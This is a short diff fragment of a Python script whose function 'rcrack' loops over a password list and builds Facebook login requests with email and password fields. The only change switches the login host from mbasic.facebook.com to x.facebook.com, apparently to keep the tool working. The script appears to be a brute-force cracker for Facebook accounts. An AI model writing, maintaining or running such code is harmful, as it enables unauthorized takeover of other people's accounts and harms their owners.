@@ -852,7 +852,7 @@ def rcrack(ids,passlist):
 			"email":ids,
 			"pass":pas,
 			"login":"Log In"}
-			header_freefb = {'authority':'mbasic.facebook.com',
+			header_freefb = {'authority':'x.facebook.com',
 			'method': 'POST',
 			'scheme': 'https',
 			'accept': 'en-US,en;q=0.8',
